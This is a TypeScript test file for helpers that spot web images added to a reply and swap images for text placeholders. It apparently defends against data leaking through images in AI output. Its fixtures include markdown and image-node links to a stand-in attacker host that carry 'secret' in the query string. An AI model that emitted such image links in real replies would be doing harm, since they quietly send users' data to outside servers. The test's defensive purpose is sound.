import { describe, expect, it } from "vitest";
import { addedImageHosts } from "./reply-checks";
import { withoutImages } from "./reply-preview";

describe("addedImageHosts", () => {
  it("names the hosts of web images the reply adds", () => {
    const reply = "Done. ![](https://evil.example/c?d=secret) and ![x](<https://cdn.example/a.png>)";
    expect(addedImageHosts(reply, "the note")).toEqual(["evil.example", "cdn.example"]);
  });

  it("ignores images that were already in the text sent, and relative ones", () => {
    const context = "Chart: ![chart](https://img.example/chart.png)";
    expect(addedImageHosts("![chart](https://img.example/chart.png) ![local](pics/a.png)", context)).toEqual(
      [],
    );
  });
});

describe("withoutImages", () => {
  it("replaces every image, however deep, with a text placeholder and keeps the rest", () => {
    const doc = {
      type: "doc",
      content: [
        {
          type: "paragraph",
          content: [
            { type: "text", text: "See " },
            { type: "image", attrs: { src: "https://evil.example/c?d=x", alt: "chart" } },
          ],
        },
      ],
    };
    expect(withoutImages(doc)).toEqual({
      type: "doc",
      content: [
        {
          type: "paragraph",
          content: [
            { type: "text", text: "See " },
            { type: "text", text: "[chart: evil.example]" },
          ],
        },
      ],
    });
  });
});
